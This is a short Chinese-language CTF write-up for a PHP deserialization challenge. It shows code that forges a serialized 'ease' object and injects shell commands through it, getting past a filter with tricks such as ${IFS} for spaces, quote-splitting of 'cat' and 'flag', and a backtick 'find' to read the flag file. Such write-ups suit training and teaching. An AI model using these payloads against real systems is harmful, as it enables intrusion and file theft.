考察序列化+waf绕过（感觉ctf从0开始确实好累啊）

首先看源码发现是反序列化绕过，于是可以伪造命令

```php
<?php

class ease{
    
    private $method;
    private $args;
    function __construct($method, $args) {
        $this->method = $method;
        $this->args = $args;
    }
 
    
   
}
$a = new ease("ping",array('dir'));
$data = base64_encode(serialize($a));
echo($data);
?>
```

然后发现目录下有一个flag_1s_here的文件夹

更换pyload

```php
$a = new ease("ping",array('dir${IFS}fl""ag_1s_here'));
```

发现文件夹下有目标php文件

然后可以读取

```php
$a = new ease("ping",array('ca""t${IFS}`find`'));
```

注意这题waf连空格都过滤